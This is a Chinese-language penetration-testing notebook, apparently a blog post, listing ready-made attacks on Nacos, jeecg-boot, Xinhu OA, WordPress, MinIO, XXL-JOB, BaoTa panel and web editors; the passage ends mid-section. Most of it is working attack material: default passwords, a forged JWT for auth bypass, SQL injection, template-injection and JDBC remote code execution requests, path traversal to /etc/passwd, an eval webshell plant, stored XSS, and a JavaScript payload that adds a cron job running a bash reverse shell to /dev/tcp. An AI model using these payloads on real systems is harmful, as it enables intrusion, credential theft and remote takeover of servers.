---

title: 渗透中常见应用记录
date: 2023/8/3 19:46:25
categories:
- 渗透测试
tags:
- 渗透思路
---

# Web应用

|    CMS    |    阿里系     |   JAVA    |  国内软件  |       数据库       |     API     |   云相关   |
| :-------: | :-----------: | :-------: | :--------: | :----------------: | :---------: | :--------: |
|  Laravel  | druid monitor | fastjson  |    畅捷    |     常见数据库     |  Wsdl接口   |    OSS     |
| ThinkPHP  |     Nacos     |   log4j   |  海康威视  |       Redis        | Swagger接口 | docker逃逸 |
|  Drupal   |  hessian组件  | Thymeleaf |   各种OA   |         ES         |   Webpack   |   Minio    |
|  DeadCMS  |               | Weblogic  |    H3C     | MQTT（物联网协议） |   GraphQL   |   Harbor   |
| Wordpress |               |   shiro   | 金蝶云星空 |                    |             |  Rancher   |
|  Joomla   |               |  spring   | jeecg-boot |                    |             |            |
|           |               |   JBOSS   |    若依    |                    |             |            |
|           |               |           |    帆软    |                    |             |            |
|           |               |           |  phpstudy  |                    |             |            |



### 泛微

泛微云桥

![image-20240428173030211](../../../images/image-20240428173030211.png)

https://mp.weixin.qq.com/s/BwJJPf5S-SKzChuDGl9i5w



泛微







### Nacos

> 一个易于使用的动态服务发现、配置和服务管理平台，用于构建云原生应用程序。

默认开放在在8848端口+/nacos，默认口令nacos/nacos

![image-20231014100945576](../../../images/image-20231014100945576.png)

- RCE

  [Nacos结合Spring Cloud Gateway RCE利用 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11493#toc-0)

  [c0olw/NacosRce: Nacos JRaft Hessian 反序列化 RCE 加载字节码 注入内存马 不出网利用 (github.com)](https://github.com/c0olw/NacosRce)

- 鉴权相关

  相关接口

  ```bash
  用户查看 
  /nacos/v1/auth/users?pageNo=1&pageSize=2&search=blur
  
  用户注册 
  /nacos/v1/auth/users  POST：username=crow&password=crow&search=blur
  /nacos/v1/auth/users?username=crow&password=crow&search=blur
  
  配置信息相关
  /nacos/v1/console/namespaces # 查看命名空间 
  /v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 # 查看pubilc配置
  /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99&tenant=namespace
  # 查看指定命名空间配置
  nacos/v1/cs/configs?export=true&tenant=namespace&group=&appName=&ids= # 导出指定命名空间配置
  ```

  权限绕过

  ```bash
  -User-Agent: Nacos-Server（低版本直接访问url，1.2~1.4可以尝试添加UA头来绕过鉴权）
  
  -serverIdentity: security（nacos开启权限认证的默认值）
  -example:example
  -test:test
  
  Nacos 默认 secret.key 配置不当权限绕过漏洞（CNVD-2023674205）
  -Nacos <= 2.2.0
  -利用默认secret.key生成JWT Token，从而造成权限绕过访问到相关API接口
  -/nacos/v1/auth/users?pageNo=1&pageSize=2&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc5OTMxODM3OH0.jR1idVKGeickN20hffQzb80Yp2qQx5m8ApKf5BeR05g  （生成的2027年过期的）
  -或者/nacos/v1/auth/users?pageNo=1&pageSize=2 添加Authorization: Bearer JWT 
  ```

  nacos使用外置derby数据库没有鉴权导致的任意select查询操作

  ```bash
  /nacos/v1/cs/ops/derby?sql=select * from sys.systables # 所有表
  /nacos/v1/cs/ops/derby?sql=select * from CONFIG_INFO # 当前配置
  /nacos/v1/cs/ops/derby?sql=select * from HIS_CONFIG_INFO # 历史配置
  /nacos/v1/cs/ops/derby?sql=select * from users # 用户
  # bypass
  /nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad&sql=/%0a*--/%25&q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%&sql=%0afrom--/&sql=/%0ausers
  
  
  derby数据库如何实现RCE - lvyyevd's 安全博客
  http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce
  ```

- 密码解密

  ```bash
  nacos使用的加密方式为Bcrypt加密，破解小工具https://link.zhihu.com/?target=https%3A//gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar
  ```

- 工具

  [pap1rman/postnacos: 哥斯拉nacos后渗透插件 maketoken adduser (github.com)](https://github.com/pap1rman/postnacos)

  [charonlight/NacosExploitGUI: Nacos综合漏洞利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用 (github.com)](https://github.com/charonlight/NacosExploitGUI)

Nacos derby Rce

- 条件

  ```
  Nacos版本2.3.2或者2.4.0等
  能访问removal和derby接口（权限问题）
  ```

- exp利用

  > VPS起恶意类，利用removal接口创建用户自定义函数，最后利用derby接口执行sql语句（执行自定义函数）
  >
  > **removal接口会遍历并执行用户上传的文件的每一行，这里相当于给了两个条件： 1. 可以执行任意SQL语句 2. 可以执行多个SQL语句**
  >
  > **修改恶意类内容来执行相关操作**

  ```sql
  # 调用sqlj.install_jar方法安装一个jar包
  CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
  # 调用SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY方法设置数据库属性,derby.database.classpath定义了数据库的类路径，即可以在数据库中调用jar包中的方法
  CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
  # 创建用户自定义函数
  CREATE FUNCTION S_EXAMPLE_1(PARAM VARCHAR(2000))
  RETURNS VARCHAR(2000) # 返回最多 2000 个字符的字符串
  PARAMETER STYLE JAVA 
  NO SQL
  LANGUAGE JAVA
  EXTERNAL NAME 'test.poc.Example.exec' # 指定了实现该函数的外部 Java 方法的完全限定名，test.poc 包中的 Example 类的 exec 方法
  # 调用自定义函数
  SELECT S_EXAMPLE_1('传参')
  ```

Nacos Jraft Hessian反序列化

https://mp.weixin.qq.com/s/0J0K0iY3bcmYcOuPGymAlQ

- 1.4.1 <= Nacos < 1.4.6 使用cluster集群模式运行

- 1.4.0、2.0.0 <= Nacos < 2.2.3 任意模式启动均受到影响

​	



### Alibaba druid monitor

> ##### **Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池**
>
> ##### 监控SQL的执行时间、监控Web URI的请求、Session监控.
>
> ![image-20230714210240219](../../../images/image-20230714210240219.png)

```php
未授权访问路径： 
/druid/index.html
/druid/websession.html
/druid/weburi.html
/druid/basic.json 
/druid/websession.json
/druid/weburi.json
    
需要登陆的话，登录入口路径：
/druid/login.html

利用姿势：
Session监控获取用户身份（session可能是过期的无用，需要爆破验证;网站不使用session来进行鉴权，所以无用）
URI获取后台路径：测试未授权访问，或者配合session进行后台操作
```



### Jumpserver

```bash
/api/v1/terminal/sessions/ # 获取敏感信息录像
/api/v1/ops/playbook/e0adabef-c38f-492d-bd92-832bacc3df5f/file/?key=../../../../../../../etc/passwd # 登录后才能使用
```



### jeecg-boot

![image-20230921214423085](../../../images/image-20230921214423085.png)

- 组件

  ```bash
  /jeecg-boot/druid/index.html # admin/123456
  /jeecg-boot/actuator  # 一般存在httptrace端点
  /jeecg-boot/doc.html，/jeecg-boot/swagger-ui.html #Basic认证 jeecg/jeecg1314
  /jeecg-boot/v2/api-docs
  
  rabitmq http://localhost:15672	guest/guest	
  nacos（服务注册发现和统一配置中心）http://localhost:8848/nacos	nacos/nacos	
  xxl-job-admin（分布式定时任务）	http://localhost:9080/xxl-job-admin	admin/123456	
  redis （缓存）	127.0.0.1:6379	密码空
  ```

- 相关接口

  ```
  GET /jeecg-boot/sys/user/exportXls # 导出用户
  GET /jeecg-boot/sys/user/list # 查询用户列表
  GET /jeecg-boot/sxams/mysqlbackup/list # 查看数据库备份
  GET /jeecg-boot/sys/sysAnnouncementSend/getMyAnnouncementSend # 消息通知
  GET /jeecg-boot/sys/dataSource/list #获取数据库相关信息
  
  # 修改密码
  PUT /jeecg-boot/sys/user/changePassword
  Content-Type: application/json
  {"username":"1231222","password":"Qwer1234!","confirmpassword":"Qwer1234!"}
  ```

- 未授权查询（可以查询到用户名和电话号码）

  ```
  /jeecg-boot/sys/user/querySysUser?username=admin
  ```

- 未授权sql注入（报错注入）

  ```
  POST /jeecg-boot/jmreport/qurestSql
  
  {"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
  ```

- SSTI注入

  ```http
  POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
  Host: 192.168.90.1:3100
  Origin: http://192.168.90.1:3100
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
  Accept: */*
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/json
  Content-Length: 123
  
  {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"open -a calculator.app  \") }' "}
  ```

- JDBC

  ```http
  POST /jeecgboot/jmreport/testConnection HTTP/1.1
  Host: 192.168.90.1:3100
  Content-Length: 383
  Accept: application/json, text/plain, */*
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
  Content-Type: application/json;charset=UTF-8
  Origin: http://192.168.90.1:3100
  Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  
  {
    "id": "1",
    "code": "dataSource1",
    "dbType": "H2",
    "dbDriver": "org.h2.Driver",
    "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\u000A$$",
    "dbName": "test",
    "dbUsername": "sa",
    "dbPassword": "",
    "connectTimes": 5
  }
  ```

- 文件读取

  ```http
  POST /fzsubway/jmreport/testConnection HTTP/1.1
  Host: xxx
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Cookie: JSESSIONID=38218C16E4022462F885161A2E0C4CCB; AntiLeech=2682583728; SECKEY_ABVK=z1hNWlXhJNRMfOWBcwIZZqelCyMfKElivU/svwCZzjo%3D; BMAP_SECKEY=2__IGYvkyC_isfYhAQNJUfG9ZmlOSJqO86jO158B6xt7DpDdl8vU_XEcAj1by2qFkzxQFvskvrzECqqBlu9Bp-PaZ6EPwYr595XK1qAjEYPDz8cu5m5ae-DSxRqaD1mP0lkcfUAFG7-lY-IRd3zSq0Oir1xRhOafcZ76YwQT0CqsHHw1iW-kvMhXjHvOhZId; JSESSIONID=2D86CE0B3842FC0E36528E7EFD223D1E
  Connection: close
  Content-Type: application/json
  Content-Length: 350
  
  {
      "id":"1",
      "code":"select * from information_schema.tables",
      "dbType":"jndi",
      "dbDriver":"com.mysql.cj.jdbc.Driver",
      "dbUrl":"jdbc:mysql://localhost:3307/test?allowLoadLocalInfile=yes",
      "dbName":"information_schema",
      "dbUsername":"fileread_/etc/passwd",
      "dbPassword":"password",
      "connectionTimaes":"5"
  }
  ```

  

### 信呼OA

- 后台文件上传

  ![image-20230901104539733](../../../images/image-20230901104539733.png)

  ![image-20230901104908007](../../../images/image-20230901104908007.png)

  还原文件

  ```http
  GET /task.php?m=qcloudCos|runt&a=run&fileid=19
  ```

  ![image-20230901104840680](../../../images/image-20230901104840680.png)

- 后台配置文件getshell

  ```php
  /index.php?a=changestyle&m=geren&d=system&ajaxbool=true&style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2F
  ```

  重新登陆

  ```php
  /index.php?a=savecong&m=cog&d=system&ajaxbool=true&rnd=705961
  ```

  ![image-20230901110753588](../../../images/image-20230901110753588.png)

  代码执行

  ```php
  POST /index.php
      
  1=phpinfo();
  ```

  ![image-20230901104430670](../../../images/image-20230901104430670.png)

  注意：用了这个后台主页会出现问题

- 后台SSRF

  保存请求

  ```http
  POST /index.php?a=setsave&m=xinhu&d=main&ajaxbool=true HTTP/1.1
  
  host=http://onj888.dnslog.cn
  ```

  发送请求

  ```http
  GET /index.php?a=testsends&m=xinhu&d=main&ajaxbool=true HTTP/1.1
  ```

- 前台存储型XSS漏洞

  ```http
  POST /?m=login&a=getoption&ajaxbool=true&num=aaaa\ HTTP/1.1
  Client-ip:111',web=0x3C7363726970743E616C65727428787373293C2F7363726970743E	--	
  ```

  > web= [XSS代码的hex编码]+[(tab键)--(tab键)]

  查看日志处触发xss代码





### Joomla

后台

```
/administrator
```

漏洞

CVE-2023-23752 POC Joomla! 敏感信息泄露漏洞

```
/api/index.php/v1/config/application?public=true
/api/v1/config/application?public=true
```

【漏洞复现 CVE-2021-23132】Joomla远程代码执行漏洞 - StarCi - 博客园
https://www.cnblogs.com/starci/p/15174896.html

Exploit Database Search
https://www.exploit-db.com/search?q=joomla

【漏洞分析】CVE-2017-14596：Joomla! LDAP注入导致登录认证绕过漏洞（含演示视频）-安全客 - 安全资讯平台
https://www.anquanke.com/post/id/86899





### Drupal

版本号

```
/install.php
```

```
X-Generator: Drupal 8 (https://www.drupal.org)
/core/CHANGELOG.txt
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
```





### Wordpress

- 目录遍历

  ```
  /wp-content/uploads
  ```

- 找插件漏洞

  ```
  /wp-content/plugins/wp-automatic/downloader.php?link=file:///var/www/podwoskizbryantb9_gmail.com.1305.w1261/site49107/wp-content/uploads/2020/01/index.php
  ```

- 扫备份文件/骑马

- 关键文件

  ```
  wp-config.php：数据库连接
  ```



#### xmlrpc漏洞

- 爆破账密
- 爆破端口

WordPress <= 6.2  [WordPress xmlrpc.php 漏洞利用 - 简书 (jianshu.com)](https://www.jianshu.com/p/42e3b065ad76)

> 没啥用，我只能收到dnslog



#### 后台getshell

技术讨论 | WordPress后台拿Shell新姿态
https://mp.weixin.qq.com/s/SHO8FcH4Oz80BkgG-K8ULg

补充：插件市场直接安装有漏洞的插件

- 媒体-新增档案（低版本）

- 修改主题/插件模板文件

- 上传新主题压缩包/新插件压缩包（插件可以直接传php文件）

  ```php
  # 即使显示PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature或者解压目录无权限
  /wp-content/uploads （目录遍历）
  ```

  ```php
  # 正常上传
  /wp-content/upgrade/主题
  /wp-content/plugins/插件
  ```

  ```php
  # webshell
  /wp-content/themes/twentytwentythree/patterns/config.php
  ```

- 插件市场安装有漏洞的插件



#### wpscan

```cmd
docker pull wpscanteam/wpscan
docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate u
```



#### 密码重置操作

> 哥斯拉的数据库只能执行查询操作
>
> 冰蝎的数据库要自己进行sql操作

```sql
select * from wp_users limit 0,20
update wp_users set user_pass=md5("test")  where user_login="oY_Zb5ADu0lV2QM0KarP6y6MrLus"
```

新增管理员

```mysql
-- 插入新用户记录到 wp_users 表
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name)
VALUES ('admin', MD5('123456'), 'admin@example.com', NOW(), 0, 'admin');

-- 获取新用户的 ID
SET @user_id = LAST_INSERT_ID();

-- 插入新用户角色到 wp_usermeta 表
INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (@user_id, 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}'),
       (@user_id, 'wp_user_level', '10');
```





#### 如何找到wordpress版本

```
https://target.com/feed 
https://target.com/?feed=rss2
```

```
ctrl+F generator
```

#### 如何找到插件版本

```
https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/README.txt
https://target.com/wp-content/plugins/PLUGINNAME/README.TXT
```

#### 如何找到主题版本

```
https://target.com/wp-content/themes/THEMENAME/style.css 
https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)
```

如果您发现过时的核心/插件/主题，请在https://wpscan.com找到漏洞利用

#### 查找日志文件

```
http://target.com/wp-content/debug.log
```

#### 获取网站上的用户名

```
http://target.com/?author=1
```

或者

```
http://target.com/wp-json/wp/v2/users 
http://target.com/?rest_route=/wp/v2/users
```

#### 爆破后台账号密码

```
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```

或者

```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0" encoding="UTF-8"?><methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>admin</value></param> <param><value>BRUTEFORCE_IN_HERE</value></param> </params> </methodCall>
```

#### 爆破端口

```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://yourip:port</string></value></param><param><value><string>https://target.com></string></value></param></params></methodCall>
```

#### 注册启用

```
http://example.com/wp-login.php?action=register
```



#### /wp-json/oembed/1.0/proxy - SSRF

尝试访问https://xxxxxxxx.com/wp-json/oembed/1.0/proxy? url= xxxxxxxxxxxx和Worpress⽹站可能 会向您提出请求。



#### /wp-json 端点暴露接⼝⽂档

访问https://www.xxxx.com/wp-json端⼝会获得有关⽹站restapi的接⼝列表。

![image-20241014211010476](\blog\source\images\image-20241014211010476.png)

这个namespcase应该和插件名有关，正常来说是公开暴露的端点，但是⼀般会以插件名称作为命名空间，⽐如/wp-json/myplugin/v1/，再结合wpscan扫描的结果，我们可以针对插件的历史漏洞进⾏排查。 针对插件有两个要检查的： 1. 通⽤插件的历史漏洞 2. ⾃定义插件的接⼝ 因此在测试的时候先根据wpscan测⼀遍插件历史漏洞，如果没有，则去排查哪些命名空间不包含在通⽤插件内，那么这 些插件可能是⾃定义的插件，那么再去⼀个个根据接⼝格式去测试接⼝。当⾃定义插件的接⼝测试完了还是没有漏洞， 则再看看通⽤插件的接⼝是否有⼆次开发之类的。



### Spring

- actuator端点
- swagger接口
- rce
- 权限绕过



### Apache Druid

kafara反序列化

![image-20230624162154282](../../../images/image-20230624162154282.png)



### Redis

[Redis漏洞 | Khaz's Blog (fgtbnc.github.io)](https://fgtbnc.github.io/2023/05/01/Redis漏洞/)



### VUE

主要是接口测试

- go-vue-admin

  [Gin-Vue-admin垂直越权漏洞与代码分析-CVE-2022-21660 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/319175.html)

  ![image-20230828171702219](../../../images/image-20230828171702219.png)

  ![image-20230828171740088](../../../images/image-20230828171740088.png)

- vue-typescript-admin

  ![image-20230828171358217](../../../images/image-20230828171358217.png)



### 芋道

```
/admin-api/infra/file-config/page?pageNo=1&pageSize=10  # 文件存储配置
```





### jeeplus

[代码审计入门之Jeeplus代码审计 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/220066.html)

```
jeeplus后台有druid，可以尝试未授权访问
https://xxx/api/jeeplus/druid/index.html
https://xxx/api/jeeplus/swagger-ui.html
```



### Minio--9000端口

**默认口令**

```
minioadmin/minioadmin
```

**CVE-2023-28432 MinIO信息泄露漏洞** 

未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，最终可能导致攻击者以管理员身份登录MinIO。

注意点：

> 在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin/minioadmin。
>
> 另外，如果开启动Minio时没有设置MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，那么Minio使用默认账号密码minioadmin，这时候再做信息泄露验证会发现读取不到管理员的账号密码，则推断存在默认口令。

```
/api/v1/check-version 可以查看MinIO版本
```

POC

```http
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Upgrade-Insecure-Requests: 1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

根据POC改包，可以看到存在信息泄露，包含内网IP泄露等。

![图片](../../../images/640)

拿到账密进入后台之后，可以利用MinIO的自更新达到RCE  [MinIO自更新RCE](https://mp.weixin.qq.com/s/7-nWwsOLUNs7S83CiH2xMQ)

[CVE-2021-21287--SSRF: 容器与云的碰撞——一次对MinIO的测试 | 离别歌](https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html)

**ssrf-CVE-2021-21287**

```
POST /minio/webrpc HTTP/1.1
HOST:IP

{"id":1,"jsonrpc":"2.0","params":{"token":"test"},"method":"web.LoginSTS"}
```

反弹shell？



### xxl-job

XXL-JOB在真实攻防下的总结 - 先知社区
https://xz.aliyun.com/t/13899?time__1311=mqmxnQG%3DF40mD%2F8iiQGk8wdAKTqQqcDDt4D&alichlgref=https%3A%2F%2Fi.hacking8.com%2F

**XXL-JOB-admin（默认端口8080）**

- 弱口令+后台命令执行

  ```
  admin/123456
  ```

  任务管理 - 新增 运行模式使用 GLUE(Shell) 

  操作处选择Glue IDE写入命令执行脚本

  ```shell
  #/bin/bash
  cmd
  ```

  操作处点击执行即可

- 未授权RCE

  - XxlJob<=2.1.2

    ```
  GET /api
    ```

    ![image-20231107095300800](../../../images/image-20231107095300800.png)
  
    [老曲新唱之XXL-JOB未授权Hessian2反序列化调试分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11091#toc-3)
  
    [奇安信攻防社区-[Web实战] 记一次曲折的不出网XXL-JOB API Hessian反序列化到Getshell](https://forum.butian.net/share/2505)
  
  - XxlJob >= 2.2.0 
  
    **XXL-JOB-execute（默认端口9999）**
    
    指纹`POST /run`
    
    ![image-20231102150058249](../../../images/image-20231102150058249.png)
    
    **注意：每发送一次下面的数据包，都需要更换jobid，因为是通过jobid作为索引来执行job的**
    
    ```http
    POST /run
    HOST: xxx:9999
    Content-Type: application/json
    XXL-JOB-ACCESS-TOKEN: default_token # 默认Token认证绕过
    
    {
      "jobId": 1,
      "executorHandler": "demoJobHandler",
      "executorParams": "demoJobHandler",
      "executorBlockStrategy": "COVER_EARLY",
      "executorTimeout": 0,
      "logId": 1,
      "logDateTime": 1586629003729,
      "glueType": "GLUE_SHELL", # GLUE_SHELL对应Linux系统，GLUE_POWERSHELL对应Windows系统
      "glueSource": "命令",
      "glueUpdatetime": 1586699003758,
      "broadcastIndex": 0,
      "broadcastTotal": 0
    }
    ```
  





### 宝塔--8888端口

https://www.t00ls.com/viewthread.php?tid=67047&highlight=%E5%AE%9D%E5%A1%94

https://www.t00ls.com/viewthread.php?tid=68409&highlight=%E5%AE%9D%E5%A1%94

- phpmyadmin

  - pma未授权访问漏洞

    影响版本

    ```
    宝塔Linux面板7.4.2版本
    宝塔Linux测试版7.5.13
    Windows面板6.8版本
    ```

    payload

    ```
    ip:888/pma
    ```

  - 默认phpmyadmin路径

    ```
    ip:888/phpmyadmin_随机字符串
    ```

- 日志XSS+CSRF导致的计划任务RCE

  影响版本

  ```
  6.x版本记录了验证码错误并存入数据库当中（老版本）
  <7.9.3版本宝塔会记录网站nginx日志，后台查看日志的地方可以XSS
  ```

  payload

  ```js
  1. 在请求中插入xss
  </textarea><script src=http://ip:port/1.js></script>
  
  2. js内容如下
  
  function addTask(TaskName, execTime, ip, port) {
      var execShell = 'bash -i >& /dev/tcp/192.168.1.14/7777 0>&1'; # 要执行的命令
      execShell = encodeURIComponent(execShell);
  
      var params = 'name=' + TaskName + '&type=minute-n&where1=' + execTime + '&hour=&minute=&week=&sType=toShell&sBody=' + execShell + '&sName=&backupTo=localhost&save=&urladdress=undefined';
  
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/crontab?action=AddCrontab', false);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(params);
  }
  
  function execTask(TaskName) {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/crontab?action=GetCrontab', true);
      xhr.send();
  
      xhr.onload = function () {
          if (this.readyState == 4 && this.status == 200) {
              var res = JSON.parse(this.responseText);
  
              if (res[0].name == TaskName) {
                  var TaskID = res[0].id.toString();
                  var xhr = new XMLHttpRequest();
                  xhr.open('POST', '/crontab?action=StartTask', false);
                  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                  var params = 'id=' + TaskID;
                  xhr.send(params);
  
                  delTask(res[0].id);
                  console.log(res[0].id);
                  return res[0].id;
              }
          }
      }
  }
  
  function delTask(TaskID) {
      var params = 'id=' + TaskID.toString();
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/crontab?action=DelCrontab', false);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(params);
  }
  
  var TaskName = Math.random().toString(36).substring(7);
  addTask(TaskName, '5', '1.1.1.1', '53');
  execTask(TaskName);
  ```

- 数据库相关

  默认保存位置

  ```cmd
  # Windows
  C:/BtSoft/panel/data
  
  # Linux
  /server/panel/data
  ```
  
  |     文件      |          作用          |
  | :-----------: | :--------------------: |
  |  default.db   |  数据库，保存登录信息  |
  |    port.pl    |   文本，保存开放端口   |
  | admin_path.pl |   文本，保存后台目录   |
  |  default.pl   | 文本，保存默认登陆密码 |
  
    `default.db`
  
    账号密码存在users表中
  
    ![image-20231222152409518](../../../images/image-20231222152409518.png)
  
    对于password的加密方式为
  
    **md5(md5(md5(password)+'_bt.cn')+salt)**
  
    其中password为明文密码，salt在users中的salt字段
  
    密码加密脚本如下
  
    ```python
    import hashlib
    # MD5 hashing with additional strings as per the provided pattern
    original_text = "5fa0a808"
    additional_string1 = "_bt.cn"
    additional_string2 = "GqYa0loI4RPm"
    
    # First MD5 hash
    first_md5 = hashlib.md5(original_text.encode()).hexdigest()
  
    # Second MD5 hash with additional string 1
  second_md5 = hashlib.md5((first_md5 + additional_string1).encode()).hexdigest()
    
    # Final MD5 hash with additional string 2
    final_md5 = hashlib.md5((second_md5 + additional_string2).encode()).hexdigest()
    print(final_md5)
    ```

  日志保存在logs表里

  ![image-20231222152227591](../../../images/image-20231222152227591.png)

- ![image-20231227114702035](../../../images/image-20231227114702035.png)








### adminer

![20220415164052-c209290a-bc97-1](../../../images/20220415164052-c209290a-bc97-1.png)

[一次adminer之旅 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11225#toc-6)

[Adminer(<4.7.9)-SSRF-众测时复现+Ffuf批量脚本 · 语雀 (yuque.com)](https://www.yuque.com/challenger-sfhjb/blog/xv4gts)



### 编辑器

#### Fckeditor

https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80.md

#### kindeditor

- 文件上传xss

  上传路径

  ```php
  /kindeditor/asp/upload_json.asp?dir=file
  /kindeditor/asp.net/upload_json.ashx?dir=file
  /kindeditor/jsp/upload_json.jsp?dir=file
  /kindeditor/php/upload_json.php?dir=file
  ```

  ```php
  POST /admin/kindeditor/asp/upload_json.asp?dir=file HTTP/1.1
  Host: xxx
  Content-Length: 210
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5
  Connection: close
  
  ------WebKitFormBoundaryZ4ILit8qr5XXhdT5
  Content-Disposition: form-data; name="imgFile"; filename="1.html"
  Content-Type: text/html
  
  <img src=1 onerror=alert(1)>
  ------WebKitFormBoundaryZ4ILit8qr5XXhdT5--
  ```

- 列目录

  ```php
  /kindeditor/php/file_manager_json.php?path=/ 
  ```

- F12修改后缀重命名文件getshell



#### Ueditor

- SSRF

  ```shell
  /ueditor/jsp/getRemoteImage.jsp?upfile=url
  /ueditor/jsp/controller.jsp?action=catchimage&source[]=url
  /ueditor/php/controller.php?action=catchimage&source[]=url
  ```

- 文件上传

  - XSS

    > Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀

    ```
    /ueditor/asp/config.json
    /ueditor/net/config.json
    /ueditor/php/config.json
    /ueditor/jsp/config.json
    ```

    上传PATH

    ```
